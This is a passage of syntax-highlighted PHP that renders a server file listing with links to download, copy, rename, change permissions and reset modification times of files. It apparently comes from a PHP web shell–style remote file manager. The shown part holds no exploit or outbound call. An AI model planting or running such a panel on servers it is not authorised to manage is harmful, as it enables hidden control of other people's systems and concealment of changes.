<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]=$<span style="color: #f0c674;">file</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">filemtime(</span>$<span style="color: #f0c674;">filepath</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'dirchmod'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getChmod(</span>$<span style="color: #f0c674;">filepath</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'dirperm'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getPerms(</span>$<span style="color: #f0c674;">filepath</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'fileowner'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getUser(</span>$<span style="color: #f0c674;">filepath</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'dirlink'</span>]=$<span style="color: #f0c674;">nowpath</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>]=$<span style="color: #f0c674;">filepath</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dirdata</span>[]=$<span style="color: #f0c674;">dirdb</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {<span style="color: #cc6666; background-color: #373b41;">        </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filename'</span>]=$<span style="color: #f0c674;">file</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'size'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span>@<span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">filepath</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">filemtime(</span>$<span style="color: #f0c674;">filepath</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filechmod'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getChmod(</span>$<span style="color: #f0c674;">filepath</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'fileperm'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getPerms(</span>$<span style="color: #f0c674;">filepath</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'fileowner'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getUser(</span>$<span style="color: #f0c674;">filepath</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'dirlink'</span>]=$<span style="color: #f0c674;">nowpath</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>]=$<span style="color: #f0c674;">filepath</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[]=$<span style="color: #f0c674;">filedb</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">while</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">unset(</span>$<span style="color: #f0c674;">dirdb</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">unset(</span>$<span style="color: #f0c674;">filedb</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">closedir(</span>$<span style="color: #f0c674;">dirs</span>);
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">sort(</span>$<span style="color: #f0c674;">dirdata</span>);
<span style="background-color: #373b41;"> </span>   @<span style="color: #c5c8c6; background-color: #1d1f21;">sort(</span>$<span style="color: #f0c674;">filedata</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dir_i</span> = <span style="color: #8abeb7;">'0'</span>;

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;form id="filelist" name="filelist" action="'</span>.$<span style="color: #f0c674;">self</span>.<span style="color: #8abeb7;">'" method="post"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'file'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'thefile'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'doing'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'dir'</span>,$<span style="color: #f0c674;">nowpath</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">dirdata</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span> =&gt; $<span style="color: #f0c674;">dirdb</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'.'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">getdir</span> &amp;&amp; $<span style="color: #f0c674;">getdir</span> == $<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>]) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">attachsize</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">dirsize(</span>$<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">attachsize</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">is_numeric(</span>$<span style="color: #f0c674;">attachsize</span>) ? <span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span>$<span style="color: #f0c674;">attachsize</span>) :<span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">'Unknown'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">attachsize</span> = <span style="color: #8abeb7;">'&lt;a href="javascript:getsize(\''</span>.$<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_li</span><span style="color: #8abeb7; text-decoration: underline;">nk'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Stat&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">thisbg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.$<span style="color: #f0c674;">thisbg</span>.<span style="color: #8abeb7;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #8abeb7; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;&lt;a href="javascript:godir(\''</span>.$<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'ser</span><span style="color: #8abeb7; text-decoration: underline;">ver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>.$<span style="color: #f0c674;">attachsize</span>.<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.$<span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirchmod'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.$<span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirperm'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="javascript:rename(\''</span>.$<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">dir_i</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">dirdb</span>[<span style="color: #8abeb7;">'filename'</span>]==<span style="color: #8abeb7;">'..'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>).<span style="color: #8abeb7;">'&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="java</span><span style="color: #8abeb7; text-decoration: underline;">script:godir(\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">getUpPath(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px </span><span style="color: #8abeb7; text-decoration: underline;">solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">file_i</span> = <span style="color: #8abeb7;">'0'</span>;

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">filedata</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">key</span> =&gt; $<span style="color: #f0c674;">filedb</span>){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; $<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'.'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fileurl</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>],<span style="color: #8abeb7;">''</span>,$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_</span><span style="color: #8abeb7; text-decoration: underline;">link'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">thisbg</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">bg(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;tr class="'</span>.$<span style="color: #f0c674;">thisbg</span>.<span style="color: #8abeb7;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #8abeb7; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td&gt;'</span>.((<span style="color: #c5c8c6; background-color: #1d1f21;">strpos(</span>$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>], $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>])<span style="text-decoration: underline;"> !== </span><span style="color: #81a2be; text-decoration: underline;">false</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;a href="'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">fileurl</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" target="_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;"> : $</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">]).</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'se</span><span style="color: #8abeb7; text-decoration: underline;">rver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'size'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filechmod'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'fileperm'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:dofile(\'downfile\',\''</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Down&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;a href="javascript:copyfile(\''</span>.$<span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;Co</span><span style="color: #8abeb7; text-decoration: underline;">py&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
